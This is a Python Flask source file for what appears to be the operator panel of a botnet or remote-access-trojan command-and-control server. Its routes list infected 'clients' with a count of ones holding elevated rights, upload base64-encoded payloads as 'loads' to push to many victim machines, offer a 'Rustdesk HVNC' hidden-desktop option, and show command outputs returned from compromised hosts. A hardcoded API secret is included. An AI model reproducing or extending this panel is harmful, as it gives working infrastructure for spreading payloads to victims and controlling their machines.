from flask import Flask, render_template, request, Response
import httpx
import json
from cryptography.hazmat.primitives import padding
import secrets
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import base64
import time
import magic

def convert_to_ago(timestamp):
    def add0(intInput):
        intInput = str(intInput)
        if len(intInput) == 1:
            return " " + intInput
        else:
            return intInput

    delta = int(time.time()) - int(timestamp)
    if delta <= 60 :
        return f"{add0(int(delta))}s"
    elif delta <= 3600:
        return f"{add0(int(delta / 60))}m"
    elif delta <= 86400:
        return f"{add0(int(delta / 3600))}h"
    else:
        return f"{add0(int(delta / 86400))}d"

def convert_to_future(timestamp):
    def add0(intInput):
        intInput = str(intInput)
        if len(intInput) == 1:
            return " " + intInput
        else:
            return intInput
        
    delta = timestamp - int(time.time())

    if delta < 0:
        return "Expired"

    if delta <= 60 :
        return f"In {add0(int(delta))}s"
    elif delta <= 3600:
        return f"In {add0(int(delta // 60))}m"
    elif delta <= 86400:
        return f"In {add0(int(delta // 3600))}h"
    else:
        return f"In {add0(int(delta // 86400))}d"


SERVER_ADDRESS = "http://127.0.0.1:9999"
API_SECRET = "dj)!gf0CN eIX)#!e9jxm)SAh0btpmr"
HOST,PORT = "127.0.0.1", 6767

app = Flask(__name__)

@app.route("/clients")
def clients():
    c_time = time.time()
    client_list_response = httpx.post(SERVER_ADDRESS + "/api/clients_list", json={"api_secret": API_SECRET})
    client_list = json.loads(client_list_response.text)

    s_time = time.time()
    statistics_response = httpx.post(SERVER_ADDRESS + "/api/statistics", json={"api_secret": API_SECRET})
    statistics = json.loads(statistics_response.text)
    
    p_time = time.time()
    new_client_data = []
    for client_id, client_data in client_list.items():
        if not client_data["online"]:
            continue
        
        client_data["first_seen"] = client_data.get("last_seen", time.time())
        client_data["last_seen"] = convert_to_ago(client_data["last_seen"])
        
        if client_data["country"] == "-":
            client_data["country"] = "NL"

        client_data["client_id"] = client_id
        new_client_data.append(client_data)
    
    new_client_data.sort(key=lambda x: x["first_seen"])
    new_client_data = new_client_data[::-1]

    statistics["total_clients"] = f"{statistics['total_clients']:,}"
    statistics["online_clients"] = f"{statistics['online_clients']:,}"
    statistics["uac_clients"] = f"{statistics['uac_clients']:,}"

    if statistics["last_new_client"] == 0:
        statistics["last_new_client"] = "N/A"
    else:
        statistics["last_new_client"] = convert_to_ago(statistics["last_new_client"])

    print(f"Time for client_list: {time.time() - c_time}\nTime for stats request: {time.time() - s_time}\nTime for processing: {time.time() - p_time}\n")

    return render_template("clients.html", client_list=new_client_data, statistics=statistics)

@app.route("/builder")
def builder():
    return render_template("builder.html")

@app.route("/loader", methods=['GET', 'POST', 'DELETE'])
def loader():

    if request.method == "POST":

        file = request.files['payload']
        execution_type = request.form.get('execution_type').split("|")[1][1:]
        payload = base64.b64encode(file.read()).decode("utf-8")
    
        if request.form.get('amount') == '':
            amount = "999999999"
        else:
            amount = request.form.get('amount')

        if request.form.get("is_recursive") != None:
            is_recursive = True
        else:
            is_recursive = False

        note = file.filename + " | " + request.form.get("note")

        if execution_type == "Rustdesk HVNC":
            payload = base64.b64decode(open("rustdesk_client.exe"))

        load_creation_response = httpx.post(SERVER_ADDRESS + "/api/issue_load", 
            json={
                "api_secret": API_SECRET,
                "cmd_type": execution_type,
                "cmd_args": payload,
                "amount": int(amount),
                "note": note,
                "is_recursive": is_recursive
            },
            timeout=None
        )

    load_id = request.args.get('delete_load')
    if load_id != None:

        httpx.post(SERVER_ADDRESS + "/api/remove_load", 
            json={"api_secret": API_SECRET, "load_id": load_id}
        )

    load_list_response = httpx.post(SERVER_ADDRESS + "/api/loads_list", json={"api_secret": API_SECRET})
    load_list = json.loads(load_list_response.text)

    new_load_data = []
    
    for load_id, load in load_list.items():
        load["percent_completed"] = int(100 * float(load["completed_amount"]) / float(load["required_amount"]))
        load["load_id"] = load_id
        load["time_issued"] = convert_to_ago(load["time_issued"])
        new_load_data.append(load)

    return render_template("loader.html", load_list=new_load_data)

@app.route("/firewall")
def firewall():

    block_id = request.args.get('delete_block')
    if block_id != None:

        httpx.post(SERVER_ADDRESS + "/api/remove_block", 
            json={"api_secret": API_SECRET, "block_id": block_id}
        )

    blocks_list_response = httpx.post(SERVER_ADDRESS + "/api/blocks_list", json={"api_secret": API_SECRET})
    blocks_list = json.loads(blocks_list_response.text)

    new_blocks_list = []
    for block_id, block in blocks_list.items():

        block["block_id"] = block_id
        if block["banned_until"] == 0:
            block["banned_until"] = "Never"
        else: 
            convert_to_future(block["banned_until"])
        new_blocks_list.append(block)


    return render_template("firewall.html", block_list=new_blocks_list)

@app.route("/server_logs")
def server_logs():

    response = httpx.post(SERVER_ADDRESS + "/api/outputs_list", 
        json={"api_secret": API_SECRET}
    )

    new_outputs_list = []

    for output_id, data in json.loads(response.text).items():

        if data['output'].startswith("storage:"):\
            output = f"Output too long to be displayed. View it raw here: http://{HOST}:{PORT}/view/{data['output'].split("storage:")[1]}"
        else:
            output = data['output']
            
        new_outputs_list.append({
            "cmd_type": data['cmd_type'],
            "time_to_complete": f'{data['time_recieved'] - data['time_issued']}s',
            "client_id": data['client_id'],
            "output": output,
            "time_recieved": data['time_recieved']
        })            

    new_outputs_list.sort(key=lambda x: x["time_recieved"], reverse=True)
    return render_template("server_logs.html", new_outputs_list=new_outputs_list)

@app.route("/individual")
def individual():

    response = httpx.post(SERVER_ADDRESS + "/api/get_output", 
        json={
            "api_secret": API_SECRET,
            "client_id": request.args.get('client_id')
        }
    )

    new_outputs_list = []
    recv_list = list(json.loads(response.text).items())
    recv_list.sort(key=lambda x: x[1]["time_recieved"], reverse=True)
    for output_id, data in recv_list:
        if data['output'].startswith("storage:"):
            output = f"Too long to display. View: http://{HOST}:{PORT}/view/{data['output'].split('storage:')[1]}"
        else:
            output = data['output']

        if data['cmd_args'].startswith("storage:"):
            cmd_args = f"Too long to display. View: http://{HOST}:{PORT}/view/{data['cmd_args'].split('storage:')[1]}"
        else:
            cmd_args = data['cmd_args']
            
        new_outputs_list.append({
            "cmd_type": data['cmd_type'],
            "cmd_args": cmd_args,
            "time_to_complete": f'{data["time_recieved"] - data["time_issued"]}s',
            "client_id": data['client_id'],
            "output": output,
            "time_recieved": convert_to_ago(data['time_recieved'])
        })

    return render_template("individual.html", new_outputs_list=new_outputs_list)

@app.route("/view/<storage_id>")
def view(storage_id):

    response = httpx.post(SERVER_ADDRESS + "/api/parse_storage", 
        json={
            "api_secret": API_SECRET,
            "storage_id": storage_id
        }
    )

    mime = magic.from_buffer(response.content, mime=True)
    if mime.startswith('image'):
        return Response(response.content, content_type='image/png')
    else:
        return Response(response.content, content_type='text/plain')
            


app.run(HOST,PORT)
